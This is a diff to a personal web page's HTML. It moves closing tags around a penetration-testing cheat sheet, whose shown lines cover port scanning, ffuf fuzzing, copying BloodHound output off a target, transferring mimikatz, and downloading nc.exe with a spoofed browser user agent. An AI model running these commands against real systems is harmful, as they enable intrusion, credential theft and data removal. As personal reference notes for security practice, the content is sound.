@@ -49,7 +49,9 @@
         <p>
             <a href="https://github.com/melnicek/melnicek.github.io/edit/master/index.html">edit</a>
         </p>
-        <pre>
+    </center>
+</body>
+<pre>
 rustscan -a RHOST -- -sC -sV -oN nmap
 ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
 ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ
@@ -72,5 +74,3 @@ scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
 scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
 Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
 </pre>
-</center>
-</body>
